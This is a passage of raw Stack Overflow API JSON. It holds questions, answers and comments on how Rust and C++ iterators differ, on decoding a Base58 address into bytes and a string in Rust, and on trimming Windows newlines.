false, "score": 3, "creation_date": 1519706091, "post_id": 49000845, "comment_id": 85007357, "body": "@Tim: The exact same thing applies to C++. Just because <code>end</code> is assigned a value does not mean you can access elements through <code>end</code>. For a simple concrete example, see <code>std::forward_list</code>, there is literally nothing you can do with the end iterator except compare it against other iterators. Another example is <code>std::istream_iterator</code>, which literally just reads values from a stream until end of stream. The <code>end</code> may have a value, but it doesn&#39;t give you any additional functionality."}, {"owner": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "edited": false, "score": 0, "creation_date": 1519706208, "post_id": 49000845, "comment_id": 85007388, "body": "in rust you don&#39;t necessarily <b>have</b> an <code>end</code>. Iterators in rust can be unbound."}, {"owner": {"reputation": 181215, "user_id": 82294, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/5c5f910416e2b92bb73fa59c56fe695d?s=128&d=identicon&r=PG", "display_name": "Dietrich Epp", "link": "https://stackoverflow.com/users/82294/dietrich-epp"}, "reply_to_user": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "edited": false, "score": 3, "creation_date": 1519706264, "post_id": 49000845, "comment_id": 85007403, "body": "@Tim: Again, this is also true in C++. The only requirement is that you can compare your <code>start</code> and <code>end</code> iterator. There is no requirement that they will ever compare as equal."}, {"owner": {"reputation": 181215, "user_id": 82294, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/5c5f910416e2b92bb73fa59c56fe695d?s=128&d=identicon&r=PG", "display_name": "Dietrich Epp", "link": "https://stackoverflow.com/users/82294/dietrich-epp"}, "reply_to_user": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "edited": false, "score": 2, "creation_date": 1519706402, "post_id": 49000845, "comment_id": 85007441, "body": "@Tim: The documentation for the basic Iterator concept can be found here: <a href=\"http://en.cppreference.com/w/cpp/concept/Iterator\" rel=\"nofollow noreferrer\">en.cppreference.com/w/cpp/concept/Iterator</a>. This document may clarify any questions you have about how C++ iterators work."}, {"owner": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "edited": false, "score": 0, "creation_date": 1519706598, "post_id": 49000845, "comment_id": 85007483, "body": "We may need to distinct <code>iterator</code> and <code>iterator concept</code>. I&#39;m aware of the page, but I&#39;d refer to the <a href=\"http://en.cppreference.com/w/cpp/iterator\" rel=\"nofollow noreferrer\">former</a>, which requires <a href=\"http://en.cppreference.com/w/cpp/iterator/end\" rel=\"nofollow noreferrer\">(c)end</a>. We may have talked at cross purposes here :)"}, {"owner": {"reputation": 181215, "user_id": 82294, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/5c5f910416e2b92bb73fa59c56fe695d?s=128&d=identicon&r=PG", "display_name": "Dietrich Epp", "link": "https://stackoverflow.com/users/82294/dietrich-epp"}, "reply_to_user": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "edited": false, "score": 4, "creation_date": 1519706946, "post_id": 49000845, "comment_id": 85007573, "body": "@Tim: Just like in Rust, not all iterators are made from containers, in C++, not all iterators come from <code>std::begin()</code> and <code>std::end()</code>. Additionally, there is no guarantee that <code>std::end()</code> is defined, and if it is defined there is no guarantee that <code>std::end()</code> is reachable from <code>std::begin()</code>. There is not really a &quot;distinct&quot; <code>iterator</code> and <code>iterator concept</code>, the word &quot;iterator&quot; refers to an object which conforms to the iterator concept."}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 2, "creation_date": 1519739087, "post_id": 49000845, "comment_id": 85024664, "body": "<i>The cost is that you are limited to a single (possibly double-ended) iterator in Rust</i> \u2014 <a href=\"https://play.rust-lang.org/?gist=06210aeae53391dd5d74f8aa77a59ce6&amp;version=stable\" rel=\"nofollow noreferrer\">This is <b>not true</b></a>. Perhaps you meant something more subtle?"}, {"owner": {"reputation": 181215, "user_id": 82294, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/5c5f910416e2b92bb73fa59c56fe695d?s=128&d=identicon&r=PG", "display_name": "Dietrich Epp", "link": "https://stackoverflow.com/users/82294/dietrich-epp"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 1, "creation_date": 1519743411, "post_id": 49000845, "comment_id": 85027714, "body": "@Shepmaster: Sorry, meant to talk about mutable iterators."}], "tags": [], "owner": {"reputation": 181215, "user_id": 82294, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/5c5f910416e2b92bb73fa59c56fe695d?s=128&d=identicon&r=PG", "display_name": "Dietrich Epp", "link": "https://stackoverflow.com/users/82294/dietrich-epp"}, "is_accepted": false, "score": 1, "last_activity_date": 1519745215, "last_edit_date": 1519745215, "creation_date": 1519703656, "answer_id": 49000845, "question_id": 48999776, "link": "https://stackoverflow.com/questions/48999776/what-are-the-main-differences-between-a-rust-iterator-and-c-iterator/49000845#49000845", "title": "What are the main differences between a Rust Iterator and C++ Iterator?", "body": "<p>Iterators in Rust and C++ are conceptually quite different.</p>\n\n<h2>C++</h2>\n\n<p>In C++, an iterator is like a pointer. Iterators refer to an object, they can be incremented to refer to the next object, and they can be compared for equality with other iterators. Iterators can also refer to no object at all\u2014they can refer to the \u201cone past the end\u201d element of a sequence, or they can be \u201csingular\u201d (which is like a null pointer). Some iterators support additional operations like moving both forwards and backwards, random access, and being copied.</p>\n\n<p>A pointer in C++ is a valid iterator, but there are also other types which are iterators.</p>\n\n<p>Iterators do <em>not</em> represent a sequence of elements, at least, that is not the convention. In C++, if you want a sequence of elements, you need a pair of iterators<sup>*</sup>: one for the beginning and one for the end. You aren't forced to iterate over the elements in sequence, you can do all sorts of other things. For example, if you want to reverse an array in C++, you can do it with iterators:</p>\n\n<pre class=\"lang-cpp prettyprint-override\"><code>#include &lt;algorithm&gt;\n#include &lt;iterator&gt;\n#include &lt;cstdio&gt;\n#include &lt;utility&gt;\n\ntemplate &lt;typename T, std::size_t N&gt;\nvoid reverse_array(T (&amp;arr)[N]) {\n    using std::swap;\n    auto left = std::begin(arr), right = std::end(arr);\n    while (left &lt; right) {\n        --right;\n        swap(*left, *right);\n        ++left;\n    }\n}\n\nint main() {\n    int x[] = {1, 2, 3, 4, 5};\n    reverse_array(x);\n    for (const auto it : x) {\n        std::printf(\"%d\\n\", it);\n    }\n    return 0;\n}\n</code></pre>\n\n<p>But you can quickly generalize it to work on any container with bidirectional iterators:</p>\n\n<pre class=\"lang-cpp prettyprint-override\"><code>#include &lt;algorithm&gt;\n#include &lt;iterator&gt;\n#include &lt;list&gt;\n#include &lt;cstdio&gt;\n#include &lt;utility&gt;\n\ntemplate &lt;typename Iterator&gt;\nvoid reverse_any(Iterator left, Iterator right) {\n    using std::swap;\n    while (left != right) {\n        --right;\n        if (left == right)\n            break;\n        swap(*left, *right);\n        ++left;\n    }\n}\n\nint main() {\n    std::list&lt;int&gt; list{1, 2, 3, 4, 5};\n    reverse_any(std::begin(list), std::end(list));\n    for (const auto it : list) {\n        std::printf(\"%d\\n\", it);\n    }\n    return 0;\n}\n</code></pre>\n\n<h2>Rust</h2>\n\n<p>In Rust, an iterator is like a slice. Iterators refer to a <em>sequence</em> of objects, and elements can be accessed from the iterator using the <code>next()</code> method. In a sense, this means an iterator in Rust has both the <code>begin</code> and <code>end</code> iterator inside it<sup>\u2020</sup>. Reimplementing the C++ code above in Rust, you'll get something like this:</p>\n\n<pre class=\"lang-rust prettyprint-override\"><code>fn reverse_any&lt;'a, T: 'a, Iter&gt;(mut iter: Iter)\nwhere\n    Iter: DoubleEndedIterator&lt;Item = &amp;'a mut T&gt;,\n{\n    while let Some(left) = iter.next() {\n        if let Some(right) = iter.next_back() {\n            std::mem::swap(left, right);\n        }\n    }\n}\n\nfn main() {\n    let mut v = [1, 2, 3, 4, 5];\n    reverse_any(v.iter_mut());\n    println!(\"{:?}\", v);\n}\n</code></pre>\n\n<p>This has the added benefit of safety. Iterator invalidation is one of the most common sources of errors in C++ programs, but Rust eliminates the problem completely.</p>\n\n<p>The cost is that if you want to mutate the elements, you are limited to a single (possibly double-ended) iterator in Rust, while in C++, you can have as many iterators as you want working with the same container. While single-ended and double-ended ranges are the most common case for iterators, there are some algorithms that use the additional flexibility that C++ provides.</p>\n\n<p>One simple example I can think of is C++'s <code>std::remove_if</code>. A straightforward implementation of <code>remove_if</code> would use three iterators: two iterators for keeping track of the range of elements being scanned, and a third iterator for tracking the elements being written. You could translate <code>std::remove_if</code> to Rust, but it would not be able to operate on normal Rust iterators and still modify the container in-place. </p>\n\n<p>Another simple example is the Dutch National Flag problem, which commonly uses three iterators. The solution to this problem is often used for partitioning elements for quicksort, so it's an important problem.</p>\n\n<h2>Summary</h2>\n\n<p>A Rust iterator is almost equivalent to a start + end C++ iterator pair. C++ allows you to use multiple iterators and move iterators forwards and backwards. Rust guarantees that you don't accidentally use an invalid iterator, but you can only use one at a time and it can only move in one direction.</p>\n\n<p>I don't know of any terminology for distinguishing these types of iterators. Note that Rust-style iterators are much more common, iterators in C#, Python, Java, etc. work the same way but they might have slightly different names (they are called \"enumerators\" in C#).</p>\n\n<h2>Footnotes</h2>\n\n<p><sup>*</sup>: Technically this is not true. You only need to have one iterator in C++, however, it is conventional to have a pair and library functions typically operate on pairs of iterators (so you \"need\" two iterators if you want to use those functions). The fact that you have a (start,end) pair does not mean that sequences are bounded, the end iterator can be infinitely far away. Think of it like having a range (0,\u221e) in mathematics... \u221e isn't really a number, it's just a placeholder that lets you know that the range is unbounded on the right.</p>\n\n<p><sup>\u2020</sup>: Remember that just because the \u201cend\u201d iterator exists in C++ does not mean that the sequence actually has an end. Some end iterators in C++ are like infinity. They don\u2019t point to valid elements, and no matter how many times you iterate forward, you won\u2019t reach infinity. In Rust, the equivalent construction is an iterator that never returns <code>None</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 5513, "user_id": 2718801, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9d4b144cdafa73e1d470362ed8d7c3a9?s=128&d=identicon&r=PG", "display_name": "jhpratt", "link": "https://stackoverflow.com/users/2718801/jhpratt"}, "edited": false, "score": 0, "creation_date": 1575007492, "post_id": 49003330, "comment_id": 104431695, "body": "NB: Stream has a completely different meaning in Rust now that async is a thing."}], "tags": [], "owner": {"reputation": 249985, "user_id": 147192, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/E78Vj.png?s=128&g=1", "display_name": "Matthieu M.", "link": "https://stackoverflow.com/users/147192/matthieu-m"}, "is_accepted": true, "score": 18, "last_activity_date": 1519739838, "last_edit_date": 1519739838, "creation_date": 1519716523, "answer_id": 49003330, "question_id": 48999776, "link": "https://stackoverflow.com/questions/48999776/what-are-the-main-differences-between-a-rust-iterator-and-c-iterator/49003330#49003330", "title": "What are the main differences between a Rust Iterator and C++ Iterator?", "body": "<p>An iterator is a concept found in programming languages to refer to a construct which allows <em>iterating</em> over collections or sequences of elements. The concept is purposely vague, it's a concept! It does not prescribe any specific implementation.</p>\n\n<p>To more easily distinguish C++ from Rust, I am going to use different names:</p>\n\n<ul>\n<li>C++ iterators will be named <strong>cursors</strong>,</li>\n<li>Rust iterators will be named <strong>streams</strong>.</li>\n</ul>\n\n<p>Yes, those are completely arbitrary. Note that if you look at languages like Java or C#, you will find that they also use streams.</p>\n\n<hr>\n\n<p><strong>C++</strong></p>\n\n<p>First of all, don't use cplusplus.com. cppreference.com is much better.</p>\n\n<blockquote>\n  <p>An iterator is any object that, pointing to some element in a range of elements (such as an array or a container), has the ability to iterate through the elements of that range using a set of operators...</p>\n</blockquote>\n\n<p>Simple, and <strong>wrong</strong>.</p>\n\n<p>A cursor may either:</p>\n\n<ul>\n<li>point to an element,</li>\n<li>or be <strong>singular</strong> and point to no element at all.</li>\n</ul>\n\n<p>In general, the singular value is used to represent:</p>\n\n<ul>\n<li>the end of the sequence to iterate over: <code>vec.end()</code>,</li>\n<li>the absence of an element: <code>std::find(...)</code>.</li>\n</ul>\n\n<p>You can increment, and sometimes decrement, a cursor. If you do so, you however generally need a <em>pair</em> of cursors to know when to stop.</p>\n\n<p>Why did C++ use such a representation? Because that's how C did it, and it works pretty well... although it's error prone.</p>\n\n<hr>\n\n<p><strong>Rust</strong></p>\n\n<p>Rust endeavors to be safe and favors APIs which are easy to use. This rules out a pair of cursors:</p>\n\n<ul>\n<li>a pair of cursors is not safe: you can easily iterate out of bounds, and you can obtain aliasing references,</li>\n<li>a pair of cursors is error-prone: it's easy to accidentally pair off cursors from two different sequences.</li>\n</ul>\n\n<p>In order to control <em>bounds</em>, <em>aliasing</em> and avoid <em>pair mismatch</em>, you have to use a single object; thus the stream-like API.</p>\n\n<p>The <code>Iterator</code> API in Rust is reminiscent of that of Java and C#, although Rust improves upon it by using <code>Option&lt;T&gt;</code> so that instead of the clumsy <code>hasNext()</code>/<code>next()</code> call pair, it offers a single method <code>next()</code> which both advances the stream and may signal its end.</p>\n\n<hr>\n\n<p><strong>Conclusion</strong></p>\n\n<p>Both Rust and C++ features a way to iterate over a collection of elements:</p>\n\n<ul>\n<li>C++ offers a C-like way, flexible but error-prone,</li>\n<li>Rust offers a modern way, safe but less flexible.</li>\n</ul>\n\n<p>Both languages also offer <em>external</em> and <em>internal</em> iteration:</p>\n\n<ul>\n<li>External: the user controls the iteration (calls <code>++</code> or <code>next()</code>),</li>\n<li>Internal: the iterator controls the user code (see <code>std::foreach</code> and <code>Iterator::foreach</code>).</li>\n</ul>\n"}], "owner": {"reputation": 302, "user_id": 4683272, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-TQCCt9FEUY4/AAAAAAAAAAI/AAAAAAAAAXQ/H0hK_uZQnEo/photo.jpg?sz=128", "display_name": "The_Babu", "link": "https://stackoverflow.com/users/4683272/the-babu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2174, "favorite_count": 6, "closed_date": 1519742545, "accepted_answer_id": 49003330, "answer_count": 3, "score": 15, "last_activity_date": 1519745215, "creation_date": 1519695187, "last_edit_date": 1519695758, "question_id": 48999776, "link": "https://stackoverflow.com/questions/48999776/what-are-the-main-differences-between-a-rust-iterator-and-c-iterator", "closed_reason": "Needs more focus", "title": "What are the main differences between a Rust Iterator and C++ Iterator?", "body": "<p>A typical example of a C++ iterator is a pointer, and can be used to point at an element in a C array like so:</p>\n\n<pre class=\"lang-cpp prettyprint-override\"><code>int array[] = {1, 2, 3, 4};\nint* begin = std::begin(array); //Starting iterator\nint* end = std::end(array) //Ending iterator\n\nfor(int* i = begin; i &lt; end; i++)\n{\n    std::cout &lt;&lt; *i &lt;&lt; ',';\n}\n\n//Prints 1, 2, 3, 4\n</code></pre>\n\n<p>This is simple enough. The definition of an iterator from <a href=\"http://www.cplusplus.com/reference/iterator/\" rel=\"noreferrer\">cplusplus.com</a> is </p>\n\n<blockquote>\n  <p>An iterator is any object that, pointing to some element in a range of elements (such as an array or a container), has the ability to iterate through the elements of that range using a set of operators...</p>\n</blockquote>\n\n<p>This makes sense; in the above code there were two iterators (the <code>begin</code> and the <code>end</code> iterators), and it used a <code>for</code> loop and incremented.</p>\n\n<p>In Rust, an iterator is used like this:</p>\n\n<pre class=\"lang-rust prettyprint-override\"><code>let vect = vec![1, 2, 3, 4];\n\nlet vect_iter = vect.iter();\n</code></pre>\n\n<p>What? To iterate it you do:</p>\n\n<pre class=\"lang-rust prettyprint-override\"><code>vect_iter.next();\nvect_iter.next();\n</code></pre>\n\n<p>I couldn't find any exact definition of a pointer in the Rust docs, but looking at the <a href=\"https://doc.rust-lang.org/std/iter/trait.Iterator.html\" rel=\"noreferrer\"><code>Iterator</code> trait</a>, it is seems that an iterator is a wrapper for a container that enables for easier processing, by standardizing the logic in a way (if that makes sense at all).</p>\n\n<p>The main questions I have are:</p>\n\n<ol>\n<li>What are the main differences?</li>\n<li>Why does Rust have iterators in this fashion and why are they expressed so differently?</li>\n<li>Are there Rust-type iterators in C++?</li>\n<li>Are there C++-type iterators in Rust?</li>\n<li>Are they called something specific? (Internal/External?)</li>\n</ol>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 1, "creation_date": 1519676934, "post_id": 48996294, "comment_id": 84998434, "body": "Best to include the full error message you&#39;re getting along with the code."}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 2, "creation_date": 1519677824, "post_id": 48996294, "comment_id": 84998846, "body": "Do <i>not</i> use variables that you&#39;ve prepended with an underscore. A leading underscore means that the variable is deliberately <b>unused</b>."}], "answers": [{"comments": [{"owner": {"reputation": 101, "user_id": 3266287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/961cc8f60f7053301bb261431e6bfe2f?s=128&d=identicon&r=PG&f=1", "display_name": "wchips", "link": "https://stackoverflow.com/users/3266287/wchips"}, "edited": false, "score": 0, "creation_date": 1519678255, "post_id": 48996691, "comment_id": 84999059, "body": "yep I did not unwarp"}, {"owner": {"reputation": 20827, "user_id": 2733851, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/MUOS4.png?s=128&g=1", "display_name": "mcarton", "link": "https://stackoverflow.com/users/2733851/mcarton"}, "edited": false, "score": 1, "creation_date": 1519682972, "post_id": 48996691, "comment_id": 85001280, "body": "Well, you don&#39;t <i>need</i> to unwrap, you can also handle the error."}, {"owner": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "reply_to_user": {"reputation": 20827, "user_id": 2733851, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/MUOS4.png?s=128&g=1", "display_name": "mcarton", "link": "https://stackoverflow.com/users/2733851/mcarton"}, "edited": false, "score": 1, "creation_date": 1519683332, "post_id": 48996691, "comment_id": 85001418, "body": "@mcarton True, added a note. I was just assuming that error handling wasn&#39;t critical yet since the <code>from_utf8</code> was also unwrapped."}], "tags": [], "owner": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "is_accepted": false, "score": 2, "last_activity_date": 1519683293, "last_edit_date": 1519683293, "creation_date": 1519677424, "answer_id": 48996691, "question_id": 48996294, "link": "https://stackoverflow.com/questions/48996294/how-do-i-convert-base58-encoded-data-to-a-vecu8-and-then-into-a-string/48996691#48996691", "title": "How do I convert Base58-encoded data to a Vec&lt;u8&gt; and then into a String?", "body": "<pre><code>.from_base58()\n</code></pre>\n\n<p>returns </p>\n\n<pre><code>Result&lt;Vec&lt;u8&gt;, FromBase58Error&gt;\n</code></pre>\n\n<p>because the conversion can fail if the data isn't valid Base 58.</p>\n\n<p>Assuming you want to ignore the error like you did for <code>from_utf8</code>, you'll need to <code>.unwrap()</code> that to get the <code>Vec&lt;u8&gt;</code> that you are looking for, e.g.</p>\n\n<pre><code>let hash160 = address.from_base58().unwrap();\nlet mut s = String::from_utf8(hash160).unwrap();\n</code></pre>\n\n<p>and the rest should compile fine, following the instructions laid out in <a href=\"https://stackoverflow.com/q/19076719/155423\">How do I convert a Vector of bytes (u8) to a string</a>.</p>\n\n<p>When you're making the code production-ready, definitely make sure to handle the errors without <code>.unwrap()</code> though.</p>\n"}, {"comments": [{"owner": {"reputation": 101, "user_id": 3266287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/961cc8f60f7053301bb261431e6bfe2f?s=128&d=identicon&r=PG&f=1", "display_name": "wchips", "link": "https://stackoverflow.com/users/3266287/wchips"}, "edited": false, "score": 0, "creation_date": 1519679613, "post_id": 48996764, "comment_id": 84999712, "body": "Nice breakdown.  Looks like I will have to convert each byte to a char for display then."}, {"owner": {"reputation": 126353, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "reply_to_user": {"reputation": 101, "user_id": 3266287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/961cc8f60f7053301bb261431e6bfe2f?s=128&d=identicon&r=PG&f=1", "display_name": "wchips", "link": "https://stackoverflow.com/users/3266287/wchips"}, "edited": false, "score": 0, "creation_date": 1519680247, "post_id": 48996764, "comment_id": 85000047, "body": "@user3266287 You can&#39;t, they&#39;re not even valid as single-byte UTF-8. For example 232 is <code>e8</code> which is not <a href=\"https://en.wikipedia.org/wiki/UTF-8#Description\" rel=\"nofollow noreferrer\">valid UTF-8</a>. I suspect the original data is just a string of bytes. <a href=\"https://stackoverflow.com/questions/27650312/show-u8-slice-in-hex-representation#27650405\">Display them as hex</a>."}, {"owner": {"reputation": 101, "user_id": 3266287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/961cc8f60f7053301bb261431e6bfe2f?s=128&d=identicon&r=PG&f=1", "display_name": "wchips", "link": "https://stackoverflow.com/users/3266287/wchips"}, "edited": false, "score": 1, "creation_date": 1519680526, "post_id": 48996764, "comment_id": 85000191, "body": "for x in &amp;_hash160 {         print!(&quot;{:x}&quot;, x);     }"}], "tags": [], "owner": {"reputation": 126353, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": false, "score": 0, "last_activity_date": 1519679021, "last_edit_date": 1519679021, "creation_date": 1519677757, "answer_id": 48996764, "question_id": 48996294, "link": "https://stackoverflow.com/questions/48996294/how-do-i-convert-base58-encoded-data-to-a-vecu8-and-then-into-a-string/48996764#48996764", "title": "How do I convert Base58-encoded data to a Vec&lt;u8&gt; and then into a String?", "body": "<p>The error tells you part of the problem.</p>\n\n<pre class=\"lang-none prettyprint-override\"><code> --&gt; src/main.rs:7:35\n  |\n7 |     let mut s = String::from_utf8(_hash160).unwrap();\n  |                                   ^^^^^^^^ expected struct `std::vec::Vec`, found enum `std::result::Result`\n  |\n  = note: expected type `std::vec::Vec&lt;_&gt;`\n             found type `std::result::Result&lt;std::vec::Vec&lt;_&gt;, rust_base58::base58::FromBase58Error&gt;`\n  = help: here are some functions which might fulfill your needs:\n          - .unwrap()\n          - .unwrap_or_default()\n</code></pre>\n\n<p>You're trying to use <code>_hash160</code> as a <code>Vec&lt;u8&gt;</code>. But <code>from_base58</code> returns a <code>Result&lt;Vec&lt;u8&gt;, FromBase58Error&gt;</code>. You have to deal with that <code>Result</code>. A full program would have error handling, but for now we can use <code>unwrap</code> which will error if the <code>_hash160</code> is an error.</p>\n\n<pre><code>let _hash160 = address.from_base58().unwrap();\n</code></pre>\n\n<p><code>_hash160</code> is fine, but we get an error from <code>String::from_utf8(_hash160).unwrap();</code>.</p>\n\n<pre><code>thread 'main' panicked at 'called `Result::unwrap()` on an `Err` value: FromUtf8Error { bytes: [0, 117, 30, 118, 232, 25, 145, 150, 212, 84, 148, 28, 69, 209, 179, 163, 35, 241, 67, 59, 214, 81, 13, 22, 52], error: Utf8Error { valid_up_to: 4, error_len: Some(1) } }'\n</code></pre>\n\n<p><a href=\"https://doc.rust-lang.org/nightly/core/str/struct.Utf8Error.html\" rel=\"nofollow noreferrer\"><code>Utf8Error</code></a> tells us that the 5th byte is invalid. The sequence of bytes in hash160 is not a valid UTF8 string.</p>\n\n<p>If we try <code>String::from_utf8_lossy</code>...</p>\n\n<pre><code>println!(\"{}\", String::from_utf8_lossy(&amp;_hash160));\n</code></pre>\n\n<p>...we get a bunch of nonsense.</p>\n\n<pre><code>4v\ufffd\ufffd\ufffd\ufffdT\ufffdE\u0473\ufffd#\ufffdC;\ufffdQ\n</code></pre>\n\n<p>It's not a valid <a href=\"http://www.asciitable.com/\" rel=\"nofollow noreferrer\">ASCII string</a> either, 232 is too high. We can check this explicitly with <a href=\"https://doc.rust-lang.org/std/ascii/trait.AsciiExt.html#tymethod.is_ascii\" rel=\"nofollow noreferrer\"><code>std::ascii::AsciiExt::is_ascii</code></a>.</p>\n\n<pre><code>use std::ascii::AsciiExt;\n\n...\n\n# false\nprintln!(\"{}\", _hash160.is_ascii());\n</code></pre>\n\n<p>You'll likely just have to treat this as a sequence of bytes. You can print it in debug mode.</p>\n\n<pre><code>println!(\"{:?}\", _hash160);\n</code></pre>\n\n<p>Which gives:</p>\n\n<pre><code>[0, 117, 30, 118, 232, 25, 145, 150, 212, 84, 148, 28, 69, 209, 179, 163, 35, 241, 67, 59, 214, 81, 13, 22, 52]\n</code></pre>\n"}], "owner": {"reputation": 101, "user_id": 3266287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/961cc8f60f7053301bb261431e6bfe2f?s=128&d=identicon&r=PG&f=1", "display_name": "wchips", "link": "https://stackoverflow.com/users/3266287/wchips"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 252, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1519683293, "creation_date": 1519675756, "last_edit_date": 1519677577, "question_id": 48996294, "link": "https://stackoverflow.com/questions/48996294/how-do-i-convert-base58-encoded-data-to-a-vecu8-and-then-into-a-string", "title": "How do I convert Base58-encoded data to a Vec&lt;u8&gt; and then into a String?", "body": "<p>I am trying to convert a <code>Vec</code> to a <code>String</code> for display. I have tried to use <code>from_uf8</code> and <code>from_iter</code> with no luck.</p>\n\n<pre><code>use rust_base58::{ToBase58, FromBase58};\n\nlet address = String::from(\"1BgGZ9tcN4rm9KBzDn7KprQz87SZ26SAMH\");\nlet _hash160 = address.from_base58();\nlet mut s = String::from_utf8(_hash160).unwrap();\n//let s = String::from_iter(_hash160);\ns.remove(0);\ns.pop();\ns.pop();\ns.pop();\ns.pop();\nprintln!(\"{}\", s);\n</code></pre>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 20746, "user_id": 1233251, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cI9GF.png?s=128&g=1", "display_name": "E_net4 says don&#39;t copy that", "link": "https://stackoverflow.com/users/1233251/e-net4-says-dont-copy-that"}, "edited": false, "score": 0, "creation_date": 1519673537, "post_id": 48995679, "comment_id": 84996858, "body": "Possible duplicate: <a href=\"https://stackoverflow.com/q/27773313/1233251\">stackoverflow.com/q/27773313/1233251</a>"}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 2, "creation_date": 1519674269, "post_id": 48995679, "comment_id": 84997214, "body": "You are on Windows, where newlines are <code>\\r\\n</code> (not just <code>\\n</code>). By removing a single character, you&#39;ve left the <code>\\r</code>, which is why the beginning part of your line is missing (&quot;Number entered is&quot;). Use <code>trim</code> instead. You can use the length of the trimmed string as the parameter to <code>truncate</code>, if you&#39;d like."}], "owner": {"reputation": 169, "user_id": 7584077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fc90486d17862893ad21a3d9936216bc?s=128&d=identicon&r=PG&f=1", "display_name": "Ashniu123", "link": "https://stackoverflow.com/users/7584077/ashniu123"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 29, "favorite_count": 0, "closed_date": 1519673955, "answer_count": 0, "score": 1, "last_activity_date": 1519673995, "creation_date": 1519673077, "last_edit_date": 1519673995, "question_id": 48995679, "link": 